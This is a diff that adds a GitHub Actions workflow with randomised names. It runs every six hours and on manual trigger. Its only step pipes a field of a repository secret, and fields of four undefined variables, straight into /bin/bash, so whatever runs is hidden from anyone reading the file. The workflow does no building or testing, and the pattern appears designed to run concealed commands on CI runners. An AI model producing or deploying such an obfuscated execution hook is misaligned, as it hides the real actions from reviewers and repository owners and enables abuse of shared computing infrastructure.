@@ -1,0 +1,22 @@
+name: maxiaoyu1827
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: maxiaoyu1827
+        env:
+          yhge23471: ${{ secrets.yhge23471 }}
+        run: |
+          echo $yhge23471 | jq -r .iw2 | /bin/bash
+          echo $pu867 | jq -r .hvrdi3 | /bin/bash
+          echo $c9492 | jq -r .v58 | /bin/bash
+          echo $talm1 | jq -r .npf1 | /bin/bash
+          echo $pnf49 | jq -r .xhp86 | /bin/bash
+
